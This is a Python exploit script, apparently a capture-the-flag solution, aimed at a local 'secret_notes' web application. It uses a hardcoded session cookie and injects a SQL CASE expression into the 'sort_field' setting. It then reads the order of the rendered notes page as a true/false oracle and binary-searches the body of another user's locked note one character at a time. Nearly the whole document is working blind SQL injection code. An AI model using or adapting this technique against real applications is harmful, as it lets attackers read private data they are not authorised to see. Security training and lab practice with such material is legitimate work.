import requests

base = "http://localhost:3000"

s = requests.Session()

s.cookies.set("secret_notes.sid","s%3AtzgkUVcDole03xwNgjDUqitQb42yOjRT.DqASZhXNhmgQCUCnuImArGDN9YZ5tu9Y%2BzoziUEBajo")

def oracle(pos, mid):
    r1 = s.post(f"{base}/settings",
                data={
                    "sort_field":f"CASE WHEN ((SELECT unicode(substr(body,{pos},1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > {mid}) THEN id ELSE -id END",
                    "sort_dir":"asc"
                }
                )
    r2 = s.get(f"{base}/notes")

    return r2.text.find("a!@#")<r2.text.find("b!@#")


flag = ""

for pos in range(1,101):
    left, right = 0, 127

    while(left < right):
        mid = (left + right) // 2
        if oracle(pos, mid):
            left = mid + 1
        else:
            right = mid

    if left == 0:
        break

    flag += chr(left)
    print(flag)

print()
print("Flag:", flag)
